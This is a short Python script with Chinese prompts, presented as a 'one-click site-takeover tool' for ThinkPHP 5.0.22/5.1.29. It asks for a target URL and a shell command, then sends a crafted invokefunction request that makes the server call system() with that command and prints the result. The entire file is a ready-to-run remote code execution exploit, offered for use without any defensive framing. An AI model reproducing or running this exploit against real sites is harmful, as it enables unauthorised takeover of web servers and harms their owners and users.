# -*- coding: utf-8 -*-
import requests

print('欢迎使用thinkphp5.0.22/5.1.29一键日站工具，作者:kurokoleung')
url = raw_input('请输入站点url:')
cmd = raw_input('请输入要执行的命令:')
payload = "/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}".format(cmd=cmd)
req = url+payload
r = requests.get(url=req)
print(r.text)
